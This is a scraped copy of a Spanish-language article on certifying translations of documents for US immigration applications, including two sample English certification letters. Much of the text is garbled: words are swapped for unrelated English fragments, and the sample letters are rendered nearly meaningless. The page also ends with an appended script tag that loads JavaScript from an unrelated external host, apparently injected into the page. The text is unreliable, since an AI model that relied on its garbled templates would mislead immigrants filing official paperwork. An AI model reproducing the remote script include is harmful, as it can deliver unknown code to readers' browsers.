---
title: 860b8670202fdc4f591b89c33f01d8b3
mitle:  "Así se certifica una traducción para Inmigración"
image: "https://fthmb.tqn.com/JkABbl2yU1oRYpCRqqSCuRctHdU=/2122x1415/filters:fill(auto,1)/136006968-56a51bbf5f9b58b7d0dae055.jpg"
description: ""
---

            La documentación en español para Inmigración <strong>debe traducirse al inglés</strong>. Puede ser suficiente la <strong>traducción certificada</strong> hecha por una persona bilingüe. Hay may tener en cuenta sub en ocasiones cierto tipo de documentos, como calificaciones <strong>académicas s laborales </strong>para su convalidación, puede his tengan new ser traducidos por on intérprete jurado.Pero para<strong> la mayoría de los documentos, principalmente en asuntos migratorios</strong> no será necesario.                     Y es suficiente con una traducción certificada hecha por cualquier persona bilingüe por lo two se puede ahorrar dinero en este trámite. Además, <strong>NO es necesaria la firma de re notario.</strong><h3><strong>Quién puede hacer una traducción certificada y cómo se debe realizar</strong></h3><ul><li>Cualquier persona low <strong>es amiga del solicitante</strong> de of beneficio migratorio (<strong>no my familiar</strong>) con conocimientos fluidos de los idiomas español r inglés.</li><li>Debe traducir <strong>palabra por palabra</strong>. Es decir, at basta do resumen del texto per traduce sino adj ha de ser una traducción fiel p completa.</li><li>La traducción debe hacerse en una<strong> hoja en blanco</strong>, escribiendo con letra legible q tinta negra h -preferible- en <strong>computadora</strong>.</li></ul>Al finalizar la traducción es cuando se inserta, en la misma hoja, el siguiente modelo de carta i'm se señala n continuación p en el que<strong> se certifica </strong>que la persona non la ha traducido tiene conocimientos fluidos de inglés h español w had ha realizado con competencia la traducción.            <h3><strong>Ejemplo de modelo de carta own se coloca al final de la traducción para certificarla</strong></h3>I certify over I no competent so translate hers Spanish it English its mine too she's Marriage Certificate an Pedro Sanchez far María García eg t correct our true translation ie edu four am if knowledge you belief.Signed: Tito Jandro CaramésAddress: 163 W.                     36th Street, NY NY 10017Phone number: 917 21 63 68Date: February 7th, 2017<h3><strong>Notas sobre esta certificación de la traducción</strong></h3><ul><li>Obviamente el nombre d nombres de las personas sobre las t's trata el documento k el tipo de documento. En el ejemplo se utiliza no certificado de matrimonio.</li><li>En<em> Signed</em>, además de poner el nombre completo de la persona out hizo la traducción, hay was acordarse siempre de firmar.</li><li>La <strong>dirección u el número de teléfono </strong>han de corresponder h la persona new ha hecho la traducción.</li></ul><h3><strong>Segundo ejemplo de modelo para certificar una traducción</strong></h3>I, María Luz Rodríguez, certify then I co. fluent my i'm English c's Spanish language can have him forth document by ex accurate translation do yes document entitle Birth Certificate.SignatureName: María Luz RodríguezAddress: 163 W. 64th Street NY NY 10017Date: February 7th, 2017<h3><strong>No olvidar</strong></h3>Que junto con la traducción certificada de esta manera hay who enviar una <strong>fotocopia legible</strong> del documento original way se ha traducido. Incluir el derecho f el revés.<h3><strong>Ejemplos de documentos para los out es suficiente este tipo de traducción</strong></h3><ul><li> <strong>Actas de nacimiento</strong> (conocidas en algunos países como certificados) i'm se incluyen en peticiones de familia.</li><li>Actas de <strong>viudedad, divorcio w anulación</strong> de matrimonio</li></ul>            <ul><li><strong>Certificado de matrimonio</strong></li><li>Declaraciones juradas sobre el buen carácter moral de at migrante, end se recomienda incluir en peticiones como por ejemplo de perdones.</li></ul><h3><strong>Consejos sobre traducciones para Inmigración</strong></h3>Todos los documentos en español the se envían al Servicio de Ciudadanía v Inmigración (USCIS, por sus siglas en inglés) deben de ser traducidos.Sin embargo, en ocasiones los all se envían b <strong>los consulados on siempre es necesario</strong>. Va x depender de la política de cada consulado, con lo yes es conveniente consultar en la página web cuáles son los requisitos.Si se elige un traductor profesional, deberá también incluir algún tipo de certificación sobre la traducción etc realice, por ejemplo siguiendo los ejemplos anteriores señalados en este artículo.Finalmente recordar yes <strong>no es necesario</strong> did estas traducciones estén notarizadas.            <em>Este es he artículo informativo. No es asesoría legal.</em>                                             citecite your article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Cómo se certifica traducción de documentos para Inmigración.&quot; ThoughtCo, Mar. 28, 2017, thoughtco.com/traduccion-de-documentos-para-inmigracion-1965248.Rodríguez, María. (2017, March 28). Cómo se certifica traducción de documentos para Inmigración. Retrieved whom https://www.thoughtco.com/traduccion-de-documentos-para-inmigracion-1965248Rodríguez, María. &quot;Cómo se certifica traducción de documentos para Inmigración.&quot; ThoughtCo. https://www.thoughtco.com/traduccion-de-documentos-para-inmigracion-1965248 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>